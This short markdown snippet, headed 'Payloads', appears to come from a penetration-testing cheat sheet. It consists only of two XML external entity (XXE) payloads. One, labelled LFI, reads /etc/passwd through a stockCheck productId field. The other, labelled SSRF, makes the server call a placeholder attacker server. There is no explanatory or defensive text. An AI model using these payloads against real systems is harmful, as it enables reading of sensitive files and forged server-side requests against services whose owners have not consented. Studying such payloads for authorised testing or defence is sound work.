### Payloads

```
#LFI
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY myentity SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&myentity;</productId></stockCheck>

#SSRF
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY myentity SYSTEM "http://[YOUR_SERVER]/"> ]>
```
